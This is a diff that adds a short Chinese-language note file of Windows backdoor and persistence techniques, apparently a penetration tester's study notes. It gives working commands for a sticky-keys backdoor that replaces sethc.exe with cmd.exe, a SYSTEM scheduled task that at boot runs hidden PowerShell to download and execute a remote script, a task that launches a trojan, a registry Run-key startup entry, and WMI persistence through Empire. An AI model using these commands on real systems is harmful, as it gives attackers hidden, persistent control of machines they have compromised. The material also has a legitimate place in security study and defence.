@@ -1,0 +1,30 @@
+操作系统后门
+
+2021年1月27日
+20:01
+
+Shift后门
+	cd c:\windows\system32  
+	move sethc.exe sethc.exe.bak   // 将sethc.exe重命名
+	copy cmd.exe sethc.exe       // 将一个cmd.exe副本保存伪装成sethc.exe
+	
+	
+定时计划后门
+    schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''<脚本url>'''))'" /sc onstart /ru System  //系统启动时自动下载并执行脚本
+
+    schtasks /create /tn PentestLab /tr "XXXXXXXXXXX.exe" /sc onstart /ru System                                                    //开机执行本机中的木马
+
+注册表注入后门
+	shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "calm" /t REG_SZ /d "XXXXXX.exe" /f     //添加到注册表，增加启动项
+	
+WMI型后门
+	          //只能由管理员创建
+	Empire                                     //没用过，本部分来自网上
+		WMI persistence established using listener ailx10 
+		with OnStartup WMI subsubscription trigger
+		进入目标机器上，验证wmi
+		在powershell中直接输入下面的命令
+		结果中可以看到 CommandLineTemlate中的内容包含 powershell.exe
+		Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter “Name=’Updater’”
+		重启目标机器
+		wmi后门成功建立连接
